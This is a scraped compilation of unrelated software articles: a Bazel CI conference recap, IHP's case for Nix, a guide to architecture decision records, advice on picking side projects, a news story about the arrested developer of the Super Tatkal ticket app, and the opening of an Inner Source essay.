<em>Urvashi Reddy explains how the CI stages work.</em></p>
<p>Reddy and her team developed a tool called <strong>build-collector</strong> that, given two commit SHAs, outputs the minimal set of modified targets.</p>
<p>The tool understands the kind of file changed and based on that runs a query to collect the affected targets. These targets are then used for the test stage and for the build and release stages. For the test stage, the tool runs an additional query to filter out only the test targets. For the build and release stages, they use another query but the strategy is different.</p>
<p>Reddy’s team has written a <strong>custom release macro</strong> used to publish release artifacts, called artifacts<em>ci</em>release. The macro makes the query easier since the build-collector can use it to collect the targets for the build and release stages.</p>
<p>Among the next steps, the team is planning to use an automatic process to <strong>identify flaky tests</strong>, tag them, and remove them from the running tests in CI. They also want to improve the query analysis performance using hashes.</p>
<h2>Adopting Bazel in a Quickly Scaling Organization</h2>
<p><strong>Charles Essien</strong>, Engineering Lead at CarGurus, talked about how he and his team went from knowing next to nothing about Bazel to actively work with the Bazel community.</p>
<p>Pre Bazel the CarGurus’ monorepo had a lot of <strong>Dark Debt</strong>: it’s the measurable range on known unknowns or the things that you know you have to improve upon. The Dark Debt at CarGurus was in the form of a 1.2M lines of code monorepo where it was too easy to include packages and dependencies transitively in monolithic artifacts, slow build times, and <strong>a build that you couldn’t trust.</strong></p>
<p>Essien explained how he and his team chose Bazel not only for the reproducible build but also to <strong>simplify</strong>: they managed to remove a lot of old code while adding only a few new to make Bazel work, decreasing the potential for tech debt. The team enabled developers to easily write new libraries and to safely reuse code thanks to BUILD visibility.</p>
<p>Talking about performance, after the bazelization, the build time went from 18 minutes with Maven in a developer laptop to 8 minutes with Bazel without a shared remote cache. With remote caching and remote execution, configured for a build without the bytes, the build time goes <em>from 90 seconds to 5 and a half minutes</em> in the worst case.</p>

<em>Charles Essien explaining the results of the bazelization.</em></p>
<p>The migration took 2 years and there were some huge challenges to face, one of the biggest was to <strong>clean up their java dependency graph</strong> and get rid of transitive dependencies, cyclic dependencies, and even duplicated dependencies. Essien had to work with developers in his organization to understand the intent behind dependencies and that slowed down the transition. He also mentioned that getting developers trust the tool and don’t clean the build was definitely not easy.</p>
<p>There were some takeaways from the migration. <strong>Observability is key</strong> since Essien and his team measured build times for Maven and Bazel and used it as a metric to show the practical benefits of Bazel. Another thing to focus on is the reproducibility of the build, meaning better caching for developers and less “it worked on my machine” as you scale</p>

            <ul>
                <li>
                    <strong>Easy Onboarding</strong>

                    <p>
                        Making haskell web apps is a complicated process. You need the right haskell compiler, a build tool, lots of libraries to do useful things and a database software. To make IHP as accessible as possible, we want to initially hide all this from the user. We set out to make IHP usable for people who have not yet heard about ghc and cabal.
                    </p>

                    <p>
                        Additionally when you are using an older compiler version, some library is missing or your postgres is not the right version this will cause trouble. Solving these package management issues is always a huge time sink.
                    </p>

                    <p>
                        Npm is mainly used for packaging javascript code. Composer is used for packaging php code. And homebrew is used for installing npm and composer ;) Nix is different: It is able to package system software and all kinds of software ecosystems. This is what allows us to bundle all the dependencies of IHP using just a single package manager. Exactly what we need to make a truly batteries-included framework.
                    </p>

                </li>

                <li>
                    <strong>Integrated Dev Tooling</strong>

                    <p>
                        Nix is unique in that it allows us to exactly specify the version of a package we want to install. We can say: <i>Install the latest <q>postgres 12.3</q></i>. Nix also allows us to install packages locally for a specific project instead of managing all the dependencies system wide.
                    </p>
                    
                    <p>
                        These two properties make nix a great fit to achive our goal of simplifying the package management process. Nix allows us to easily install all this software for developers working with IHP. We can install exactly the right compiler, the right postgres version as well as all the right libraries we need. We can be sure that all packages are installed in the right version (no time sinks!) and nothing is missing. We also don't have any interference with existing packages already installed on the system. It's like docker without the overhead of a VM.
                    </p>

                    <p>
                        The IHP dev server automatically starts and manages a postgres server in the background, just for your project. <a href="https://news.ycombinator.com/item?id=23612217" target="_blank">IHP is the first framework tighly integrating the database in the dev mode.</a> <a href="https://twitter.com/zaiste/status/1277678880782979072" target="_blank">We're sure that this will be standard in a couple of years.</a> Without the possibilities of nix, we would have never tried to integrate postgres into the IHP dev server. The integrated database schema designer wouldn't really work that well. It might not be obvious, but without nix we would not have tools like the IHP schema designer or the database viewer.
                    </p>

                </li>

                <li>
                    <strong>Pinned Versions</strong>

                    <p>
                        Nix makes IHP projects reproducable in a way unseen in other software ecosystems.
                        <a href="https://github.com/digitallyinduced/ihp-boilerplate/blob/master/Config/nix/nixpkgs-config.nix#L21" target="_blank">All IHP projects share exactly the same set of packages.</a> The same compiler version, the same libraries, the same postgres version and even the same custom dependencies your app depends on. <q>Works on my machine</q> will not happen anymore. When there is a problem, other IHP users will most likely already have faced the same issue. 
                    </p>

                    <p>
                        This is only possible because nix allows us to pin down the set of package definitions to a specific git commit of the nix package registry.
                    </p>
                </li>

                <li>
                    <strong>Trade Offs</strong>

                    <p>
                        Nix is far from perfect. Early on we had a lot of problems with slow rebuild times, which we could resolve by using the great <a href="https://cachix.org/" target="_blank">cachix</a> binary cache. Additionally Nix is very hard to install. This is a stumbling block for a lot of people. <a href="https://github.com/digitallyinduced/ihp/issues/93" target="_blank">Especially when using certain macOS systems you cannot even install nix at all.</a> Luckily most of the nix problems, like the macOS issues will be solved with time. 
                    </p>

                    <p>
                        Once nix is set up, it's usually working very well. Over time the benefits of nix really outweight the time spent on solving nix-specific problems. The rising industry adoption of Nix is a good indicator for this. <a href="https://engineering.shopify.com/blogs/engineering/what-is-nix" target="_blank">Cool companies like Shopify are progressively adopting Nix.</a>
                    </p>

                    <p>
                        At digitally induced we believe that highest quality software is built on solid foundations.
                        Nix is technological superior to any other existing package manager. Therefore we belive it's right to make nix a hard requirement of IHP. 
                    </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<p>At work we have "design decision documents" (DDDs).
Others call the "architecture decision records" (ADRs).
In short,
you record a problem, its possible solutions, and which one you picked.
This method can be lightweight and easy,
so it is a great way to start working more systematically
on any software architecture.
I recommend writing them.
ThoughtWorks recommends to
<a href="https://www.thoughtworks.com/radar/techniques/lightweight-architecture-decision-records">adopt them since 2017</a>.</p>
<p><img alt="makin decisions ain't  easy" src="https://beza1e1.tuxen.de/img/decisions_easy.jpg"></p>
<h2>Why decision records?</h2>
<p>Important about decision records is that they
document a decision made at one point in time.
This means they require no maintenance (apart from archival)
and this is a big argument why they are so lightweight.
If you make no decisions,
there is no effort.</p>
<p>At the beginning of a software project
you make a lot of high impact decisions quickly.
You pick a programming language, framework, libraries, version control system,
folder structure, tools, and methods.
Usually these choices are made haphazardly.
Trying to make them all thoughtfully is futile.
However, you should be able to write them down with a rational.</p>
<p>Another strength of a lightweight process shows up
when a project is under pressure.
You don't have the capacity for rigorous decision making
like building a prototype.
Writing down the decision should still be possible.
Deadline pressure or lack of capacity are valid arguments
in a decision record so you might document that
you accept the technical debt to meet a deadline.
At least, a few years later people know <em>why</em> you made stupid choices.</p>
<p>You could even record decision
long after the decision were actually made.
While the best time to write it was right before the decision was made,
the second best time is now.</p>
<p>Having decision records is useful to communicate a decision to many people.
This includes new people joining months later.
Here it pays off if you can write well.
I have seen Powerpoint slides
which are incomprehensible without the original author
but still considered "documentation".
This is tragic.
Such diagrams are more of a memory aid than documentation.
Hence, I favor well written prose.</p>
<p>Decision records also serve as historic documentation
when someone questions the decision.
You can revisit the argumentation and check why the decision looks stupid now.
Did the circumstances change?
Then there is no reason to blame anyone.
Was something overlooked?
Now we might learn something:
How can you prevent to overlook similar things in the future?</p>
<p>A decision record is frozen once a decision is made.
The only exception is declaring it obsolete.
This has three implications:</p>
<ul>
<li>If something changes about a decision,
  write a new record instead of modifying the old one.</li>
<li>The record is <em>not</em> the place to track the implementation.
  You probably have an issue tracker for such stuff.</li>
<li>Only one decision per record.
  If you try to make multiple at once, the risk is that only one is made.
  Now the record is in an ambiguous half-frozen state.</li>
</ul>
<p>Tooling does not matter.
You can use a wiki, Word, Markdown, or whatever.
Just ensure that you can link to individual records.</p>
<h2>Lightweight Template</h2>
<p>As a running example,
let us decide about which SQL database technology we use.</p>
<p>Once you have collected a few decision records,
you appreciate a summarizing header.
After a title like "SQL Database Tech",
I like to see a short table like this:</p>
<table>
<tbody><tr>
<th>Status</th><td>Approved on <a>2020-10-18</a></td>
</tr><tr>
<th>Decision</th><td>Option 2: PostgreSQL</td>
</tr><tr>
<th>Roll-out</th><td><a>#353</a></td>
</tr><tr>
<th>Primary author</th><td>Linus Carmack</td></tr>
</tbody></table>

<p>The <strong>status</strong> tells you
if a decision record is still a draft, valid, or obsolete.
If valid, it should also have a date since when.
I also like to link it to some meeting notes where the decision was made
but that depends on your organization.
Likewise, for obsolete decisions link somewhere for a rational,
like another decision record.</p>
<p>The second field is an ultra-short version of the <strong>decision</strong> made.
It is for people who already know the record,
so one or two words should be enough.
Use whatever name people use when discussing the solutions.
Internal jargon is ok since it is just a name like "PostgreSQL" in our example.</p>
<p>The <strong>roll-out</strong> field links to a ticket.
Once a decision is made,
it is not instantly implemented.
While the status field here describes the status of the decision,
this links to where the implementation status is tracked.</p>
<p><strong>Primary author</strong> contains a <em>single</em> name
to provide a contact.
It also says "primary" to suggest that others can contribute.
If you want to document all authors,
don't use the header.</p>
<p>Now comes the first prose section of the record,
which describes the <strong>problem</strong>.
A reader should get all relevant context here
and probably links for more details.
Keep the solution space as wide as possible.
For our example,
we should explain why we are already committed to SQL and NoSQL is no option.
Also, it should explain why an explicit decision is necessary
and to defer it by abstraction is no option.</p>
<p>If a problem requires multiple decisions
then you might get multiple decision records
with similar problem descriptions.
Or maybe you should think more what the actual problem is.
Sometimes people mistake the reason to make a decision
with the problem to solve.
For example,
"customer wants to know what database tech we will use"
is not a problem.
The problem is to store data persistently.</p>
<p>Next comes a section which describes all <strong>potential solutions</strong> to the problem.
This section usually has the most contributors and is revised the most.
Describe every solution in as much detail as you can.
For our example,
the usual options would be SQLite, MySQL, and PostgreSQL.
Maybe even commercial ones.
A little over-specification does not hurt.
You could describe how you would deploy and host PostgreSQL on its own server.</p>
<p>Cross check that the solutions actually solve the described problem.
Surprisingly often I found mismatches.
Sometimes the problem was described too constraining.
Sometimes some text had to be shifted from problem to solution or vice versa.
And sometimes we had forgotten to consider an aspect of the problem.</p>
<p>I despise use a table for the solution descriptions.
It conflicts with my preference for prose.
If you write longer text or even include diagrams,
the table becomes to wide to be readable.
So a table makes you write short bullet points
and those are harder to comprehend.</p>
<p>The third section is about <strong>evaluation</strong> and making the decision.
It helps to keep a list of evaluation criteria somewhere
to pick the relevant ones.
If you have nothing, browse through the
<a href="https://en.wikipedia.org/wiki/List_of_system_quality_attributes">Wikipedia list of ilities</a>.
I try to keep this section short and
prefer to describe details (like pros and cons)
in the previous section.
Here a table is appropriate to compare the solutions.
I like to only put + and - signs into the cells
and order the rows by importance.
From the table, it should be obvious which solution is picked.
Ideally, you only take a quick look at the first two rows
and pick the solution with the most + symbols.</p>
<p>To summarize a table of contents looks like this:</p>
<ul>
<li>Header</li>
<li>Problem description</li>
<li>Potential Solutions<ol>
<li>SQLite</li>
<li>MySQL</li>
<li>PostgreSQL</li>
</ol>
</li>
<li>Decision</li>
</ul>
<h2>Optional extensions</h2>
<p>The header could contain more fields like
<strong>revision</strong>, <strong>executive summary</strong>, <strong>id</strong>, <strong>decision makers</strong>,
or whatever.</p>
<p>A section or table about the <strong>stakeholders</strong>
can make sense under some circumstances.
For example, a safety or security expert might be relevant or not
for the decision.</p>
<p>The problem description section can be split up into
<strong>assumptions</strong>, <strong>constraints</strong>, <strong>requirements</strong>, <strong>related things</strong>, and whatnot.
I avoid overly formal templates
because if a section makes no sense
it encourages people to skip entire sections.
This is not a habit to encourage.</p>
<p>Likewise the potential solutions or the evaluation can be formalized more
to include mandatory <strong>risk evaluation</strong>, <strong>cost estimates</strong>, and whatnot.</p>
<p>You could include <strong>meeting notes</strong> around a decision
within the record.
This only makes sense if meeting notes are not already captured otherwise.</p>
<p>In a political setting,
you could capture the <strong>opinions</strong> of each stakeholder separately.
This way a worried party can have their objections on record
with their name attached instead of an anonymous downside description.</p>
<p>Maybe a <strong>glossary</strong> makes sense?
On the other hand, decision records should probably not that long to require one.</p>
<h2>Even more lightweight</h2>
<p>You could trim decision records down even more
if you don't describe alternative solutions.
Instead you only describe the one you picked eventually.
Such records are still valuable since they capture the rational.
However, if a new proposal comes up later,
you don't know if it was considered originally
and dismissed for some valid reasons.
Anyways, you might use this lighter approach at the beginning of a project
when a lot of decisions must be made quickly.
Incomplete records are better than none.</p>
<p>One last advice:
The first ten decision records will be crappy.
Get them done sooner than later.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://iuliangulea.com/images/how-to-choose-project-cover.png" alt="Cover image"></p><blockquote><p>One finalized side project is better than three abandoned ones.</p></blockquote><p>This is the premise of the article you are about to read. A finalized, working project can be placed on your resume, be showcased to other people, offer you more learning opportunities, and potentially become your income source in the future.</p><p>An abandoned project is a little bit of learning and a plus one to the number of your abandoned projects.</p><p>If you disagree with the above, then you can simply close this article and move on.</p><p>If you agree, here’s a related comic.</p><p><img src="https://www.commitstrip.com/wp-content/uploads/2014/11/Strip-Side-project-650-finalenglish.jpg#c" alt="Side Project Comic"></p><p>I think we’ve all been in those shoes and have our own skeletons in the closet.</p><p>I have been programming for over 11 years and have started many pet projects, but only a few of them saw the light of the day (or rather the eyes of the users).</p><p>Choosing a project idea is a task that depends on many factors like your level of experience, domain of activity, tech stack, your interests, your goals, etc., so do not expect to learn the best idea ever for your next project in this article.</p><p>What you can expect is to learn some generally applicable principles that will help you make a better choice.</p><h2 id="how-do-people-learn">How Do People Learn?</h2><p>Let’s briefly discuss about <a href="https://iuliangulea.com/brain-basics/">how people learn</a> first. Whenever you read a book, watch a tutorial, or practice a skill, neurons in our brain fire together, forming complex neural circuits. It is these circuits that store the knowledge and skills we possess.</p><p>Moreover, our memory is associative, meaning that subsets of neural patterns are parts of many circuits. That explains how you can end up thinking about totally unrelated things to what you are currently doing. Some words might trigger a memory, which triggers another memory, and so on.</p><p>For instance, think of the last time you went to the seaside. Then think about what was the most memorable moment during that trip. Finally, think about something related to that unforgettable moment. This is how you hop around memories.</p><p>This also hints toward a more efficient approach toward learning new things: it is easier to “reuse” existing circuits rather than create new ones.</p><p>Consider these two explanations of what a computer program is:</p><blockquote><p>A computer program is a collection of instructions organized in functions, classes, modules, and libraries that perform a specific task.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p></blockquote><blockquote><p>A computer program consists of code that is grouped into entities called functions, classes, modules, and libraries. Like a lego, you can build a program to perform a specific task by combining various pieces together.</p></blockquote><p>The first is generic and very abstract, and it doesn’t consider any pre-existing knowledge in the listener’s mind. The second one makes an analogy and is easier to process since you can tap into your existing knowledge about what lego is and how it works.</p><p>Another crucial thing to learning is pre-requisite knowledge. You cannot build a roof without building the walls of a house. Although this sounds obvious, sometimes you might get too enthusiastic about a potential project, but because you don’t understand the fundamentals, you won’t be able to realize your idea.</p><h2 id="build-on-the-current-state-of-your-knowledge">Build On The Current State Of Your Knowledge</h2><p>Your next project should be based on some of your existing knowledge upon which you can learn new things. This might sound self-evident, but sometimes we simply skip the analysis phase and jump right into the development phase.</p><p>The amount of all knowledge required to build a project should overlap with your existing experience. Otherwise, learning will be inefficient.</p><p>You might want to take on a project that will teach you <strong>lots</strong> of new concepts, but bear in mind that creating new neural pathways takes time and energy. Keep in mind that there is no fast way to do that, so if you want to be efficient at it, you have to take the slow route.</p><p><img src="https://iuliangulea.com/images/how-to-choose-project-venn-diagram.png" alt="Three types of projects as Venn diagrams"></p><p>There is a blurry line between efficient and inefficient projects from a learning standpoint:</p><ul><li>Choose a project that is too easy for you, and your learning will be minimal. Also, you might become bored along the way, not even finalizing it.</li><li>Choose a project that is too complex, and you will become frustrated and overwhelmed with the amount of information you need to learn and apply, which will increase the chances that you might as well abandon it.</li></ul><p>Finally, to shape up and structure the knowledge you already have, it helps to think about it through the prism of the <a href="https://iuliangulea.com/pyramid-of-mastery/">Pyramid of Mastery</a>.</p><p><img src="https://iuliangulea.com/images/the-pyramid-of-mastery/the-pyramid-of-mastery-1.png" alt="The Pyramid Of Mastery"></p><p>The Pyramid of Mastery allows you to define a domain in terms of four layers: Elements (main concepts and building blocks), Rules (both how Elements operate and general Rules within the domain), Tools, and Frameworks.</p><p>With this in mind, let’s discuss some strategies that can help you choose your next pet project are.</p><h2 id="3-aspects-to-help-you-choose-your-next-side-project">3 Aspects To Help You Choose Your Next Side Project</h2><p>Below you can find general guidelines that will help you make the right decision regarding your next project.</p><h3 id="1-focus-on-a-single-layer-from-the-pyramid-of-mastery">1. Focus On A Single Layer From The Pyramid Of Mastery</h3><p>This is a guiding principle I follow whenever I choose to do a personal project: narrow down the scope of the type of knowledge you want to gain.</p><p>Do not mix up new Elements, Rules, Tools, and Frameworks together. Ideally, focus on a single layer and choose a project that will help you gain expertise in that specific area. If that is not possible, do not go more than two layers.</p><p>This is a common mistake that beginners make. They want to learn as much as possible from a single project. But quite often, those expectations are unrealistic. If you want to learn a framework, in a new programming language, using principles that you haven’t used before (e.g., <a href="https://en.wikipedia.org/wiki/Asynchrony_(computer_programming)">asynchronous programming</a>, <a href="https://en.wikipedia.org/wiki/Design_Patterns">design patterns</a>, etc.), you are going to be overwhelmed with so much new information, that you won’t be able to process it and learn anything at all.</p><p>On many occasions, I made this mistake myself, and each time I had to review my project choice and start over with more realistic expectations and a narrower learning scope.</p><p>Therefore, if you want to start a project to learn new programming concepts, make it in the language you know best. If you’re going to build a project to learn a new programming language, do not throw in new Elements and Rules — focus on what you already know. Likewise, if you want to learn a new framework, make sure you are familiar with most of the Elements, Rules, and Tools it consists of.</p><p>This is also why it is not advisable to start learning programming with a Framework — you will get overwhelmed very fast by the vast amount of information on different Elements, programming Rules, programming language Rules, framework Rules, various Tools, etc. if you do not already know them.</p><h3 id="2-choose-a-project-of-an-appropriate-size">2. Choose A Project Of An Appropriate Size</h3><p>You might want to build the next Facebook, but sometimes you should focus on building a simple function or class first. This is a bit exaggerated, but as a general rule, your projects' scope should increase once you get more experience in your field.</p><p><img src="https://iuliangulea.com/images/the-pyramid-of-mastery-swe/scale-of-impact.png#c" alt="Image with line chart"></p><p>Initially, focus on smaller projects with limited scope. When you start learning something, the amount of information you have to process is enormous. Since our <a href="https://iuliangulea.com/working-memory/">working memory</a> has a very limited capacity, keep the tasks small to not overwhelm it.</p><p>Once you have a solid foundation and understanding of the essential Elements and Rules, you can start working on slightly bigger projects. It is very similar to construction.</p><p>In construction, you cannot raise the walls of a brick house in a day. There is a certain recommended height to which you can grow the walls — around 4–5 feet<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>. Once you reach that, you have to let the cement solidify, as otherwise, the wall can tilt and collapse.</p><p><strong>Pro Tip:</strong> the scope size is also a better indicator than years of experience of a software engineer’s seniority level. You can have 5 years of experience, but if you work on individual modules and do not participate in bigger architectural decisions, you are a mid-level developer.</p><h3 id="3-choose-something-that-will-motivate-you">3. Choose Something That Will Motivate You</h3><p>Another aspect of project selection is the motivation you have to build it. If you are working on something you are excited about, chances are higher that you will actually finalize it and learn from it.</p><p>Even small projects can be challenging and exciting to build — you just need to put some thought into what you would like to create, depending on what you would like to learn.</p><p>There are several approaches to it that I find helpful:</p><p><strong>1. Think about what actions you are repeatedly performing that you could automate.</strong> It can be a small thing, like <em>writing a function that would erase the contents of your computer’s Trash Bin and then automate it to execute once a week.</em></p><p><strong>2. Think about what would be useful to you once in a while.</strong> Even if there might be dozens of existing services out there that offer it. For instance, <em>write a command-line interface (cli) to which you are providing a path, and it doubles down the sizes of all the images it finds in that path, thus saving disk space.</em></p><p><strong>3. Think about what features you like in some products/services, and build them from scratch.</strong> Here, the options are countless. Just pick your favorite service and try to reproduce a small part of it.</p><p><strong>4. Think about a problem you have that you would like to resolve.</strong> This resonates with point 1 from above, but on a bigger scale. And this is also the entry point to the realm of entrepreneurs and doers. Many people have started their companies simply because they didn’t like the current state of the services and products they have used.</p><p>And then there’s always the option to google a list of project ideas and pick one, but you can do better than that.</p><p>Remember that the goal to follow when selecting a project is to learn something new while also improving your work/life/leisure/etc. This will keep fueling your motivation and help you go through it till the end.</p><h2 id="conclusion">Conclusion</h2><p>Successful learning projects are much more than just an idea. However, a good idea is the first step that you need to have to build a project.</p><p>To wrap up this guide, here are the strategies to keep in mind when choosing your next project:</p><ol><li>Decide on what you want to learn. The Pyramid …</li></ol></div></div>

        <p><figcaption>S. Yuvarajaa</figcaption></p></figure><div><p><em>Editor’s note: IRCTC’s response on Twitter has been added to the story.&nbsp;</em></p><p>Kozhikode, KERALA — On the afternoon of October 23, S. Yuvarajaa was at his home in Tirupur, writing software, when the Railway Police Force came knocking on his door.&nbsp;</p><p>“Did you develop this app?” the policemen asked, pointing to a phone screen displaying Super Tatkal, a phone app developed by Yuvarajaa that books tatkal rail tickets much faster than Indian Railway Catering and Tourism Corporation (<a href="https://www.huffingtonpost.in/news/irctc/">IRCTC</a>), the Indian Railways’ famously cumbersome website.</p><p>When he said ‘yes’, Yuvarajaa, a 32-year-old alumnus of IIT-Kharagpur, was arrested under the Indian Railways Act 1989 for the “unauthorized business of procuring and supplying railway tickets”.</p><p><em><strong><a href="https://www.huffingtonpost.in/entry/lsr-student-suicide-lockdown-poverty-hostel-policy_in_5fa8ab81c5b6f21920dd705e" target="_blank" rel="noopener noreferrer">Lockdown Poverty And Hostel Policy Push LSR Scholarship Student To Suicide</a></strong></em></p><p>Soon after his arrest, the railway authorities deactivated Super Tatkal and Super Tatkal Pro, which were available on Google Playstore until then. Yuvarajaa spent about a week in jail.</p><p>Now out on bail and faced with mounting legal fees, Yuvarajaa says he just wants the railways to understand that far from “swindling” users — as the railways have alleged — he just wanted to help rail passengers book their tickets with ease.</p><p>“I want them to talk to me and find out how the apps can help IRCTC’s ticket-booking operations. I might have been naïve and unaware of consequences when I developed the apps but I had the best of intentions,” Yuvarajaa told <em>HuffPost India</em>. “I have a solution that can effectively address the current issues on the IRCTC website<strong>.</strong> I would like to help them make their website better so that end users, the passengers, can book tickets easily.”</p><p>For now, Yuvarajaa and Super Tatkal have become unfortunate case studies of what happens when the software industry’s ethos of digital disruption crashes into India’s famously prickly bureaucracy as epitomised by the 167-year-old Indian Railways.&nbsp;</p><p>A young coder from a small town who gave up a comfortable job in an aeronautics firm to set up his own business, Yuvarajaa is a poster child for the Indian government’s mission to support digital entrepreneurs of the sort that Prime Minister <a href="https://www.huffingtonpost.in/news/narendra-modi/">Narendra Modi</a> exhorts to “take risks” and embark on adventures.</p><p>Yet, as Yuvarajaa’s arrest shows, the biggest impediment to innovation are his government’s many departments. Yuvarajaa saw himself as an entrepreneur’ but the Railways press release announcing his arrest described him as a “tout”.</p><p>&nbsp;“Regulatory frameworks, be that of IRCTC or that of any other government institution, should not be bypassed,” said S. Arunachalam, Academic Director of Centre for Innovation and Entrepreneurship, Indian School of Business. “But I think that he should have been warned first to reach an amicable solution.”&nbsp;</p><p>IRCTC responded to <em>HuffPost India</em> on Twitter, saying that the use of “illegal software” is prohibited under the Railways Act.</p></div><div><blockquote data-dnt="true" data-conversation="none"><p lang="en" dir="ltr">The software developed was used illegally to book tkts through the tickets denying genuine users.Use of illegal software is prohibited under Rly act. No faster app as these features were  available with IRCTC which were disabled to ensure level playing field .</p>— IRCTC (@IRCTCofficial) <a href="https://twitter.com/IRCTCofficial/status/1328668272032583683?ref_src=twsrc%5Etfw" target="_blank">November 17, 2020</a></blockquote></div><div><h3><strong>From Tirupur to Super Tatkal</strong></h3><p>The story of Super Tatkal has its roots in Yuvarajaa’s journey from a small town in Tamil Nadu to Bengaluru, India’s self-described Silicon Valley.</p><p>Yuvarajaa comes from a family of farmers—&nbsp;his father worked as one until he died in 2008 and his mother, Eswari, still cultivates the family’s 30 acres of land.</p><p>Yuvarajaa recalls that he first started programming in BASIC as an 11-year-old. Soon, he developed a love for coding and started considering engineering as a career option when he was introduced to Java in Class XI.&nbsp;&nbsp;</p><p>In 2007, Yuvarajaa signed up for an aeronautical engineering degree at the Madras Institute of Technology, Tamil Nadu’s premier tech school. Since he had topped Class XII in his district, he had a three-year scholarship of Rs 3,000 per month from the Indian government’s Defence Research and Development Organisation (DRDO).</p><p>At MIT-Chennai, Yuvarajaa met others like him who loved coding.&nbsp;&nbsp;</p><p>“We were a group of people who liked programming. When some of us went on to take up jobs, Yuvarajaa went for higher studies as he was passionate about engineering,” said Akilan, a friend and fellow aeronautical engineer who is currently working in New Jersey.&nbsp;</p><p>After graduating in 2010 from MIT Chennai, Yuvarajaa joined IIT-Kharagpur for an M. Tech in aeronautical engineering. Again, he had a scholarship, this time for topping the GATE (Graduate Aptitude Test in Engineering).&nbsp;</p><p>Once he finished his IIT course, he joined a firm in Bengaluru.&nbsp;</p><p>“In aeronautical engineering there are very few private firms which offer jobs. But he got one of the good jobs available in India,” Akilan said.&nbsp;</p><p>While working in Bengaluru, Yuvarajaa frequently booked tickets to travel home to Tirupur.&nbsp;</p><p>“It was then that I realised that the IRCTC app is terribly slow. Besides, I always wanted to develop apps and this felt like the right time,” Yuvarajaa told <em>HuffPost India</em>. “So Super Tatkal took shape.”</p><p>Super Tatkal, launched in 2016, allowed users to prefill their journey details and paste these onto the IRCTC website. This sped up the booking process by about five times the usual time it takes to book tickets on IRCTC website, said Yuvarajaa.&nbsp;</p><p>The app was buggy at first, he said, but a steady group of users kept sharing their experience.&nbsp;</p><p>“I went about correcting the bugs and realised that the app was gaining traction,” he said.&nbsp;</p><p>Super Tatkal was free for the first year. Later, as the maintenance cost of servers increased to Rs 10,000 per month, Yuvarajaa asked for user contributions — but this didn’t help much. He then decided to finance the app through in-app purchases where users were asked to buy a stack of 10 virtual coins for Rs 20. After the first three free bookings, the app charged five coins per transaction —&nbsp;ie, a nominal fee of Rs 10 per booking.</p><p>The Railway Police claims Yuvarajaa earned Rs 20 lakh through Super Tatkal between 2016 and 2020. This may sound like a big number, but it works out to about Rs 40,000 per month.</p><p>Yuvarajaa said all his users were aware of the payment model and that he had not cheated anyone into paying.&nbsp;&nbsp;</p></div><figure>
        <p><figcaption>A screengrab of the Super Tatkal Pro app before it was deactivated.</figcaption></p></figure><div><h3><strong>‘Didn’t take permission’</strong></h3><p>While Super Tatkal was taking off, Yuvarajaa soon became comfortable in the startup bubble. He quit his job in 2017 and started a truck aggregator app, Speedbird trucks, along with two of his friends.&nbsp;</p><p>“It was like an Ola or Uber for trucks. It took off well in the beginning,” Yuvarajaa said. But before the app could get traction, trouble started. It was difficult to convince people to use the trucks available on the app because existing contracts from known services seemed simpler for users.&nbsp;</p><p>“We took on lease two trucks to run the app but that ended in losses,” said Yuvarajaa. The company was built on the life savings of the three young men and it lacked a business model.&nbsp;</p><p>“To arrive at the business model one has to experiment with various models and this costs money,” said Yuvarajaa. The company also lacked a mentor, an industry insider, who could have offered steady advice and feedback.&nbsp;</p><p>“It is difficult to network and find help when you are a beginner,” he said.&nbsp;</p><p>It also didn’t have an investor. “We were at the experimental stage and could not win the confidence of an investor,” he said. In the experimental stage, startups built on little resources are mostly on their own and can only dream of reaching the patent filing stage which gets support from the Union government.&nbsp;</p><p>Meanwhile, Super Tatkal was doing relatively well. “The users kept growing and I launched a second app—Super Tatkal Pro—which allowed booking on IRCTC’s rail connect app in 2019,” he said.&nbsp;</p><p>To keep his startup alive and to support his family, Yuvarajaa also worked as a freelance programmer. The income was small but steady. However, unbeknownst to Yuvarajaa, his app was on the Railway police’s radar.&nbsp;</p><p>“RPF Cyber Cell at Southern Railway Headquarters Chennai had played a key role in analysis of data and identification of the fake app developer’s location and also collected digital evidences i.e server source code, application source code, end-users list and bank statements of the offender,” the Railway police said in their press release.</p><p>Yuvarajaa’s mistake, an officer at the security command centre of RPF told <em>HuffPost India</em>, was that “he did not obtain the needed permission from IRCTC and was working like a ticketing agent”.&nbsp;</p><p>Under the Railways Act, all those who help passengers with ticketing are expected to register with the IRCTC as an agent. Does this apply for app creators? The officer reserved his comment.&nbsp;</p><p>Yuvarajaa, however, said that he was “trying to create something of value for people” and that he “was not aware that the app would be considered illegal”. IRCTC could have sent him a warning or a cease-and-desist order before swooping in, he rued.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p><p>Arunachalam, of the Indian School of Business, said Yuvarajaa’s case points to the need for more mentorship in India’s start-up space.&nbsp;&nbsp;</p><p>“He does not seem to have understood the process well,” Arunachalam said.</p><p>Back in Tirupur, Yuvarajaa said that he hopes to work with the Railways once his legal troubles end.</p><p>Will he revive his apps if he gets the required permission from IRCTC?&nbsp;</p><p>“I would like to,” he said.</p><p><em>This story was corrected to say that Yuvarajaa was arrested on October 23 and spent about a week in jail, not a month-and-a-half.</em></p></div>

<p><em>This is the first of a series of two articles describing the reasoning and the steps behind the idea of correlating software product delivery process performance metrics with community health and collaboration metrics as a way to engage execution managers so their teams participate in Open Source projects and Inner Source programs.  </em>What you will read in these articles is an extension of a talk I gave at the event InnerSource Commons Fall 2020.</p>



<p>Background</p>



<p>There is a very popular African proverb within the Free Software movement that says…</p>



<p>“<em>If you want to go fast, go alone. If you want to go far, go together.</em>“</p>



<p>Many of us used it for years to promote collaboration among commercial organizations over doing it internally in a fast way at the risk of reinventing the wheel, not following standards, reducing quality, etc.</p>

<p>The proverb describes an implicit <em>OR</em> relation between the traditional Open Source mindset, focused on longer term results obtained through extensive collaboration, and the traditional corporate mindset, where time-to-market is almost an obsession.</p>



<p>Early in my career I got exposed as manager (I do not code) to agile and a little later to Continuous Delivery. This second set of principles and practices had a big impact on me because of the tight and positive correlation that proposes between speed and quality. Until then, I had assumed that such correlation was negative, when one increases the other decreases or vice-versa.</p>



<p>During a long time, I also assumed unconsciously as truth the negative correlation between collaboration and speed. It was not until I started working in projects at scale when I became aware of such unconscious assumption and start question it first and challenging it later.</p>



